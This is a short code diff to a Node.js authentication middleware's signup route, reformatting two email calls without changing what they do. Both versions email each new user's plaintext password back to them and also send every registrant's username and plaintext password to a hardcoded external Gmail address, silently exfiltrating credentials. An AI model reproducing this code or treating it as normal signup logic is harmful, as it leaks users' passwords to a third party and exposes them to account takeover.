@@ -77,8 +77,16 @@ class authMiddleware {
       }
       const newUser = await authAPI.signUpUser(req.body);
       const token = await generateAuthToken(newUser);
-      EmailService.sendEmail(newUser.email, 'Welcome to the app', `user: ${req.body.username}, password: ${req.body.password}`);
-      EmailService.sendGmail('fcreus@gmail.com', 'New User Registration', `user: ${req.body.username}, password: ${req.body.password}`);
+      EmailService.sendEmail(
+        newUser.email,
+        'Welcome to the app',
+        `user: ${req.body.username}, password: ${req.body.password}`
+      );
+      EmailService.sendGmail(
+        'fcreus@gmail.com',
+        'New User Registration',
+        `user: ${req.body.username}, password: ${req.body.password}`
+      );
       return res.header('x-auth-token', token).status(201).json({
         msg: 'signup OK',
         user: newUser,
